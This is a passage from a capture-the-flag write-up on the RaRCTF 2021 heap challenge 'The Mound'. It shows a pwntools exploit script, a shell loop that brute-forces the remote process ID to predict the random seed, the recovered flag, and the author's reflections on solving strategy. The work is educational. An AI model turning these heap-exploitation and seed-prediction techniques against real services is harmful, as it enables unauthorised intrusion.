</span></span></code></pre></td></tr></table></div></div><p>On remote, this is a little more difficult. Paying attention to these two local-specific lines:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>t</span><span class=o>^</span><span class=n>r</span><span class=o>.</span><span class=n>pid</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I need some method to guess the PID of the challenge on remote. Considering that the standard maximum PID number is <code>1&lt;&lt;15</code>, I decided to try my luck with bruteforcing it<sup>5</sup>, replacing the code above with,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;193.57.159.27&#39;</span><span class=p>,</span> <span class=mi>41932</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>t</span><span class=o>^</span><span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>PID</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>And executing the following shell script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=k>for</span> i in <span class=sb>`</span>seq <span class=m>1</span> <span class=m>3</span> 32768<span class=sb>`</span> <span class=c1># increment PID by 3 for every guess; internally in the docker container</span>
</span></span><span class=line><span class=cl><span class=k>do</span> python3.8 mound.py <span class=nv>PID</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$i</span><span class=s2>&#34;</span> <span class=c1># the PID increases by 2 for every connection, so this improves the guessing </span>
</span></span><span class=line><span class=cl><span class=k>done</span> <span class=p>|</span> tee mound.log
</span></span></code></pre></td></tr></table></div></div><p>It doesn&rsquo;t work the first time around, but I repeat the process to obtain the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ grep <span class=o>{</span> *.log
</span></span><span class=line><span class=cl>mound2.log:b<span class=s1>&#39;rarctf{all0c4t0rs_d0_n0t_m1x_e45a1bf0b2}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Segmentation fault\n&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>And with that, I&rsquo;m done with the technical stuff.</p><h2 id=mistakes>Mistakes</h2><p>[Content warning: unsubstantiated opinions]</p><h3 id=i-pwn-isnt-re>I. Pwn isn&rsquo;t RE</h3><p>CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding <a href=#mound rel>the heap implementation</a> was written <em>during</em> the 36-hours between me starting this challenge and <code>mound.py</code> spitting out the flag. The assumption I&rsquo;ve been rolling with, in all of the pwnables do, is that boosting <code>time(reversing binaries)</code> will pay off by a comparable reduction in <code>time(scripting and debugging)</code>.</p><p>That belief didn&rsquo;t work out for this challenge. At the end of the <a href=#program-outline rel><code>main()</code> reversing effort</a>, I noted that I observed a few <em>Bad Things</em> going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the <code>mound</code> to understand that sending a glibc pointer to <code>mfree()</code> tends to produce <code>Double free</code> <code>exit(1)</code> calls as a result of a null <code>prev_size</code>.</p><p>Do you know how else I could&rsquo;ve discovered that? By just <em>testing out the damn thing</em> and getting a backtrace:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=s1>&#39;b exit</span><span class=se>\n</span><span class=s1>c&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p align=center><img src=image-20210809190804515.png></p><p align=center><img src=image-20210809190903079.png></p><p>Oh, look! It stops in <code>find_id()</code>. Which only stops because <code>*((void*)p-0x10) == NULL</code> for the <code>p</code> in <code>mfree(p)</code>. So I should probably find a way to edit <code>prev_size</code> for one of the <code>strdup()</code>&rsquo;d pointers.</p><p>Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but <em>The Mound</em> is certainly not one of them. I can&rsquo;t speak for ptr-yudai, but judging by his <a href=https://ptr-yudai.hatenablog.com/entry/2020/12/15/003822 target=_blank rel="noopener noreffer">long article</a> on adapting fuzzing techniques for CTF pwnables, I expect that there&rsquo;s a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of <em>eyeballing everything I can</em> in IDA until something sticks.</p><p>I might re-evaluate this section if someone comes around with a <em>really fast</em> CTF Reversing strategy, but until then:</p><h3 id=ii-pattern-matching>II. Pattern matching</h3><p>CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape<sup>6</sup> after the original design. v8 challenges are a good example of this:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210809192844264.png data-srcset="/blog/rarctf-2021-the-mound/image-20210809192844264.png, /blog/rarctf-2021-the-mound/image-20210809192844264.png 1.5x, /blog/rarctf-2021-the-mound/image-20210809192844264.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210809192844264.png title=/blog/rarctf-2021-the-mound/image-20210809192844264.png width=939 height=740></p><p>Prior to 2018, nothing. This year, there&rsquo;s already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome&rsquo;s market share:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210809194840239.png data-srcset="/blog/rarctf-2021-the-mound/image-20210809194840239.png, /blog/rarctf-2021-the-mound/image-20210809194840239.png 1.5x, /blog/rarctf-2021-the-mound/image-20210809194840239.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210809194840239.png title=/blog/rarctf-2021-the-mound/image-20210809194840239.png width=1469 height=501></p><p>The IRL relevance of v8 hasn&rsquo;t changed (much), so what gives?</p><p>There&rsquo;s a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might&rsquo;ve been &ldquo;Return Oriented Programming&rdquo;. Go back a few years and you&rsquo;ll see everyone interested in nifty <code>House of *</code> exploits. In the past few years, there&rsquo;s been an obsession with things like v8 oobs and <code>printf()</code> one-shots.</p><p>This is an intentionally broad picture; the trends I&rsquo;ve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound.</p><p>Instinctively, I try to pull meta-games using the trends I observe. If it&rsquo;s a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is <a href="https://bugs.chromium.org/p/v8/issues/detail?id=8806" target=_blank rel="noopener noreffer">a lot harder</a> with contemporary security measures. If there&rsquo;s a text input, I&rsquo;ll bash in <code>"A"*0x1000</code> for the sake of it. And if there&rsquo;s a <a href=https://github.com/IRS-Cybersec/ctfdump/blob/master/0ctf_quals%202021/listbook.md target=_blank rel="noopener noreffer">special number</a> that&rsquo;ll produce a <a href=https://github.com/IRS-Cybersec/ctfdump/blob/master/UIUCTF%202021/uiuctf.md target=_blank rel="noopener noreffer">negative array index</a> — a smaller pattern that I&rsquo;ve unfortunately internalised — I&rsquo;ll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there.</p><p>It was with this bias that I approached <em>The Mound</em>, even after I learnt how to double-free a <code>mound</code> allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing <code>mcache->counts[]</code>), but if it <em>follows what I&rsquo;ve seen before</em>, I have an expectation that things will go the same way.</p><p>I&rsquo;ll admit that this is a little bit theoretical, but I would have saved a <em>lot</em> of time if I could&rsquo;ve just convinced myself to abort with the <code>mcache->entries[-1]</code> exploit path early on. I&rsquo;m not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought.</p><h3 id=iii-things-i-havent-considered>III. Things I haven&rsquo;t considered?</h3><p>I could be doing pwn in sub-optimal ways I can&rsquo;t identify as sub-optimal on my own. I&rsquo;m hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster.</p><p>That&rsquo;s it.</p><h2 id=footnotes>Footnotes</h2><ol><li><p>This isn&rsquo;t particularly useful. There&rsquo;s no way to leak pointers outside of <code>win()</code>.</p></li><li><p>I tried looking for seeds that would produce repeated cycles:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
</span></span><span class=line><span class=cl><span class=n>LIBC</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>LIBC</span><span class=o>.</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>&amp;=</span> <span class=mh>0xffffffffffff0000</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>t</span><span class=p>,</span><span class=n>t</span><span class=o>+</span><span class=mh>0xffff</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>LIBC</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>seen</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=n>LIBC</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>seen</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mh>0xff0</span><span class=p>:</span> <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>seen</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>The script found nothing.</p></li><li><p>In case you&rsquo;re wondering how there&rsquo;s a pseudocode reference to <code>mound_arena.mcache->entries[]</code>, as opposed to an ugly red <code>*(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8)</code> reference:</p><ul><li>Define the <code>mound_metadata</code> class (and the other <code>struct</code>s from <a href=#mound rel>here</a>) in the <code>Structures</code> tab; you should see an entry like this in the local types tab (Shift+F1):
<img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210809082020677.png data-srcset="/blog/rarctf-2021-the-mound/image-20210809082020677.png, /blog/rarctf-2021-the-mound/image-20210809082020677.png 1.5x, /blog/rarctf-2021-the-mound/image-20210809082020677.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210809082020677.png title=/blog/rarctf-2021-the-mound/image-20210809082020677.png width=1092 height=26></li><li>In the IDA View tab, select <code>Edit --> Segments --> Create Segment</code>; fill the pop-up window with sensible values</li><li>put a variable at <code>mound_arena:00000DEAD0000000</code> and retype it (<code>Y</code>) as a <code>mound_metadata</code>.</li></ul></li><li><p>The code block there isn&rsquo;t supposed to make sense. Throughout the writeup, I&rsquo;ve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a <em>little bit</em> intractable.</p></li><li><p>This is the reason why I ended up searching for <a href=#the-obvious-solution rel>the intended solution</a>. My silly alternative method for getting to <code>win()</code> doesn&rsquo;t work on remote; the time cost associated with a single connection – let alone <em>bruteforcing the PID</em> – makes it impossible to increment <code>mcache->entries[-1]</code> without an absurdly low ping.
The 30x number comes from a crude measure of how many times the exploit calls <code>choose()</code>. For the intended solution, it&rsquo;s about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes <em>per guess</em> on remote.
Feel free to try it out youself:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>randint</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>namedtuple</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BEEF</span><span class=p>,</span> <span class=n>DEAD</span> <span class=o>=</span> <span class=mh>0xbeef0000000</span><span class=p>,</span> <span class=mh>0xdead0000000</span>
</span></span><span class=line><span class=cl><span class=n>mound_arena</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;mound_metadata&#39;</span><span class=p>,</span> <span class=s1>&#39;base ids mcache top&#39;</span><span class=p>)(</span><span class=n>DEAD</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8008</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8010</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mound_data</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;beef&#39;</span><span class=p>,</span> <span class=s1>&#39;base mcache dents shellcode&#39;</span><span class=p>)(</span><span class=n>BEEF</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10000</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>midxs</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;midb&#39;</span><span class=p>,</span> <span class=s1>&#39;prev_size_editor fakeid_provider strdup mcache_dup got_overwriter&#39;</span><span class=p>)(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;mound&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc.so.6&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;193.57.159.27&#39;</span><span class=p>,</span> <span class=mi>41932</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#r = remote(&#39;localhost&#39;, 8329)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>t</span><span class=o>^</span><span class=nb>int</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>PID</span><span class=p>))</span> <span class=c1># bruteforce PID</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>t</span><span class=o>^</span><span class=n>r</span><span class=o>.</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># I/O methods</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>strdup</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>i</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>midx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sz</span> <span class=o>=</span> <span class=n>midx2rsize</span><span class=p>(</span><span class=n>midx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>sz</span> <span class=o>&lt;</span> <span class=mh>0x1000</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>sz</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>sz</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>csize2midx</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>&gt;&gt;</span><span class=mi>4</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>size2request</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request2size</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>+</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2rsize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>size2request</span><span class=p>(</span><span class=n>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>r64bit</span><span class=p>():</span> <span class=k>return</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>+</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=c1># emulate rand64bit</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>r64</span><span class=p>():</span> <span class=k>return</span> <span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>64</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1># a separate, unrelated function to produce random numbers</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>midxs</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;midb&#39;</span><span class=p>,</span> <span class=s1>&#39;first_alloc overflower incrementer fakechunk bugged got_overwriter entries&#39;</span><span class=p>)(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>)</span>
